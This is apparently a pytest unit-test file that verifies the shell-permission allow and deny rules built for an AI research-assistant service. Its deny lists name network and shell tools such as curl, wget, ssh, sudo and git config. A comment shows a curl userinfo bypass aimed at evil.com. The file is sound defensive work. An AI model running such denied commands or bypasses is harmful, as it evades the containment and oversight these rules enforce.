"""
Unit tests for Story #929 (Issue #745 security hardening bundle).

Tests verify:
  - Item #6: chgrp and install deny rules are restored
  - Item #10: git config is denied (closes core.hooksPath persistence backdoor)
  - Item #17: systemctl restart cidx-server is NO LONGER in allow rules
  - Item #2c: cidx-curl.sh wrapper IS in allow when provided; NO raw
              Bash(curl http://*) or Bash(curl https://*) rules exist in allow
              (those 36 hardcoded rules were replaced by the wrapper in #929)
  - Regression: all #738 deny categories remain intact after #929 changes

No mocks of the service itself.  Tests use the real code path:
  ResearchAssistantService._build_permission_settings().
"""

import pytest

# ---------------------------------------------------------------------------
# Item #6: rules restored in deny
# ---------------------------------------------------------------------------
RESTORED_DENY_RULES = [
    "Bash(chgrp *)",
    "Bash(install *)",
]

# ---------------------------------------------------------------------------
# Item #10: git config must be denied
# ---------------------------------------------------------------------------
GIT_CONFIG_DENY_RULE = "Bash(git config *)"

# ---------------------------------------------------------------------------
# Item #2: curl bypass/exfil deny rules (broad deny preserved)
# ---------------------------------------------------------------------------
CURL_DENY_RULES = [
    "Bash(curl *)",  # broad deny — public internet blocked
    "Bash(curl *@*)",  # userinfo bypass: curl http://10.0.0.1@evil.com
    "Bash(curl *--resolve*)",  # resolver-override bypass
]

# ---------------------------------------------------------------------------
# Item #17: systemctl restart cidx-server must NOT be in allow rules
# ---------------------------------------------------------------------------
SYSTEMCTL_RESTART_RULE = "Bash(systemctl restart cidx-server)"

# ---------------------------------------------------------------------------
# Regression: existing #738 deny categories must remain intact
# ---------------------------------------------------------------------------
RETAINED_DENY_RULES_FROM_738 = [
    "Bash(sudo *)",
    "Bash(su *)",
    "Bash(doas *)",
    "Bash(ssh *)",
    "Bash(scp *)",
    "Bash(rsync *)",
    "Bash(wget *)",
    "Bash(python3 *)",
    "Bash(bash *)",
    "Bash(sh *)",
    "Bash(apt *)",
    "Bash(npm *)",
    "Bash(pip *)",
    "Bash(git push *)",
    "Bash(git commit *)",
    "Bash(crontab *)",
    "Bash(killall *)",
    "Bash(systemctl stop *)",
    "Bash(systemctl start *)",
]


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def service(tmp_path):
    """Create ResearchAssistantService backed by a real (temporary) SQLite DB."""
    from code_indexer.server.storage.database_manager import DatabaseSchema
    from code_indexer.server.services.research_assistant_service import (
        ResearchAssistantService,
    )

    db_path = str(tmp_path / "data" / "cidx_server.db")
    (tmp_path / "data").mkdir(parents=True)
    DatabaseSchema(db_path=db_path).initialize_database()
    return ResearchAssistantService(db_path=db_path)


@pytest.fixture
def cidx_meta_path(tmp_path):
    return str(tmp_path / "golden-repos" / "cidx-meta")


@pytest.fixture
def curl_wrapper_script_rule(tmp_path):
    """Simulate the cidx-curl.sh wrapper allow rule as built by the service."""
    script_path = str(tmp_path / "scripts" / "cidx-curl.sh")
    return f"Bash({script_path} *)"


@pytest.fixture
def permission_settings(service, cidx_meta_path, curl_wrapper_script_rule):
    """Build permission_settings via the real helper method (curl wrapper provided)."""
    return service._build_permission_settings(
        cidx_meta_path,
        cleanup_script_rule=None,
        curl_wrapper_script_rule=curl_wrapper_script_rule,
    )


@pytest.fixture
def deny_list(permission_settings):
    return permission_settings["permissions"]["deny"]


@pytest.fixture
def allow_list(permission_settings):
    return permission_settings["permissions"]["allow"]


# ---------------------------------------------------------------------------
# Item #6: chgrp and install deny rules restored
# ---------------------------------------------------------------------------


class TestRestoredDenyRules:
    """Item #6: chgrp and install deny rules were removed in af12e986 — now restored."""

    @pytest.mark.parametrize("rule", RESTORED_DENY_RULES)
    def test_rule_in_deny(self, deny_list, rule):
        assert rule in deny_list, (
            f"{rule!r} must be in deny list (Item #6 restore). "
            f"Got deny list: {deny_list}"
        )


# ---------------------------------------------------------------------------
# Item #10: git config is denied
# ---------------------------------------------------------------------------


class TestGitConfigDenied:
    """Item #10: git config must be denied to close core.hooksPath persistence backdoor."""

    def test_git_config_in_deny(self, deny_list):
        assert GIT_CONFIG_DENY_RULE in deny_list, (
            f"'Bash(git config *)' must be in deny list (Item #10). "
            f"Got deny list: {deny_list}"
        )


# ---------------------------------------------------------------------------
# Item #17: systemctl restart cidx-server removed from allow rules
# ---------------------------------------------------------------------------


class TestSystemctlRestartRemovedFromAllow:
    """Item #17: operator decision — restart delegated to auto-updater; RA has no need."""

    def test_systemctl_restart_not_in_allow(self, allow_list):
        assert SYSTEMCTL_RESTART_RULE not in allow_list, (
            f"'Bash(systemctl restart cidx-server)' must NOT be in allow list (Item #17). "
            f"It must be removed since restart authority is delegated to the auto-updater. "
            f"Got allow list: {allow_list}"
        )


# ---------------------------------------------------------------------------
# Item #2c: cidx-curl.sh wrapper replaces 36 hardcoded RFC1918 allow rules
# ---------------------------------------------------------------------------


class TestCurlWrapperAllowRule:
    """Item #2c: the cidx-curl.sh wrapper rule must be in allow when provided."""

    def test_wrapper_rule_in_allow_when_provided(
        self, allow_list, curl_wrapper_script_rule
    ):
        assert curl_wrapper_script_rule in allow_list, (
            f"{curl_wrapper_script_rule!r} must be in allow list (Item #2c wrapper). "
            f"Got allow list: {allow_list}"
        )


class TestNoCurlRawAllowRules:
    """Item #2c regression: raw Bash(curl http://*) / Bash(curl https://*) rules
    must NOT appear in allow — those 36 hardcoded rules were deleted in #929."""

    def test_no_raw_curl_http_allow_rules(self, allow_list):
        raw_http_rules = [
            r
            for r in allow_list
            if r.startswith("Bash(curl http://") or r.startswith("Bash(curl https://")
        ]
        assert raw_http_rules == [], (
            "No raw 'Bash(curl http://*)' or 'Bash(curl https://*)' rules must appear "
            "in allow (they were replaced by cidx-curl.sh wrapper in #929). "
            f"Found: {raw_http_rules}"
        )


class TestCurlDenyRules:
    """Item #2: broad curl deny and bypass rules must be in deny list."""

    @pytest.mark.parametrize("rule", CURL_DENY_RULES)
    def test_curl_deny_rule_in_deny(self, deny_list, rule):
        assert rule in deny_list, (
            f"{rule!r} must be in deny list (Item #2 exfil containment). "
            f"Got deny list: {deny_list}"
        )


# ---------------------------------------------------------------------------
# Regression: existing #738 deny categories must remain intact
# ---------------------------------------------------------------------------


class TestExisting738DenyCategoriesRetained:
    """Regression: all #738 deny categories must remain after #929 changes."""

    @pytest.mark.parametrize("rule", RETAINED_DENY_RULES_FROM_738)
    def test_deny_rule_retained(self, deny_list, rule):
        assert rule in deny_list, (
            f"{rule!r} must remain in deny list (regression from #738). "
            f"Got deny list: {deny_list}"
        )
